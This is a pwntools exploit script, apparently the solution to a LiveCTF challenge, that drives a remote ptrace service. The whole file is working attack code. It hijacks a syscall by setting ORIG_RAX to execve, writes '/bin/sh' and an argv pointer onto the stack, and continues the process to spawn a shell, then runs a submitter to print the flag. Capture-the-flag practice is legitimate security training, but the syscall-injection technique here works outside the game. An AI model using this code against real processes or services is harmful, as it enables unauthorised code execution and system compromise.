from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = os.environ.get('PORT', '31337')

PTRACE_SYSCALL = 24
PTRACE_SETREGS = 13
PTRACE_GETREGS = 12
PTRACE_PEEKTEXT = 1
PTRACE_POKETEXT = 4
PTRACE_PEEKUSER = 3
PTRACE_POKEUSER = 6
PTRACE_CONT = 7

R15 = 0
R14 = 8
R13 = 16
R12 = 24
RBP = 32
RBX = 40
R11 = 48
R10 = 56
R9 = 64
R8 = 72
RAX = 80
RCX = 88
RDX = 96
RSI = 104
RDI = 112
# On syscall entry, this is syscall#. On CPU exception, this is error code.
ORIG_RAX = 120
RIP = 128
CS = 136
EFLAGS = 144
RSP = 152
SS = 160

r = remote(HOST, int(PORT))

def ptrace(req, addr, data, again=True):
    r.recvline(b"What ptrace request")
    r.sendline(b"%x" % req)
    r.sendline(b"%x" % addr)
    r.sendline(b"%x" % data)
    r.recvuntil(b"ptrace returned ")
    res = int(r.recvuntil(b"\n"), 0)
    if again:
        r.sendline(b"1")
    else:
        r.sendline(b"0")
    return res

ptrace(PTRACE_SYSCALL, 0, 0)
rsp = ptrace(PTRACE_PEEKUSER, RSP, 0)
print(ptrace(PTRACE_PEEKTEXT, rsp, 0))
ptrace(PTRACE_POKEUSER, ORIG_RAX, 59)
ptrace(PTRACE_POKEUSER, RSI, 0)
ptrace(PTRACE_POKEUSER, RDX, 0)
ptrace(PTRACE_POKEUSER, RAX, 0)
ptrace(PTRACE_POKETEXT, rsp, 0x0068732f6e69622f)
ptrace(PTRACE_POKETEXT, rsp + 8, rsp)
ptrace(PTRACE_POKETEXT, rsp + 16, 0)
ptrace(PTRACE_POKEUSER, RDI, rsp)
ptrace(PTRACE_SYSCALL, 0, 0)
ptrace(PTRACE_CONT, 0, 0, False)

r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
